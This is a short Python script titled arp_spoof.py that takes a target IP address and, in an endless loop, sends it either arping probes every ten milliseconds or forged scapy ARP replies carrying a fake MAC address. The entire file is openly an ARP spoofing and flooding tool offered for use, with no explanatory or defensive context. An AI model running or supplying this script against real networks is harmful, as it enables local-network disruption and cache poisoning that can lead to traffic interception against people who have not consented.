#!/usr/bin/env python3
import time, sys, os
if len(sys.argv)!=2:
    print("Usage: arp_spoof.py <target_ip>")
    sys.exit(1)
target = sys.argv[1]
print("Sending gratuitous ARP to", target)
# if arping exists:
if os.system("which arping > /dev/null")==0:
    while True:
        os.system(f"arping -c 1 -I eth0 {target} >/dev/null 2>&1")
        time.sleep(0.01)
else:
    try:
        from scapy.all import ARP, send
        pkt = ARP(op=2, pdst=target, psrc=target, hwsrc="00:00:00:02:02:02")
        while True:
            send(pkt, verbose=False)
    except Exception as e:
        print("Requires arping or scapy:", e)
        sys.exit(1)
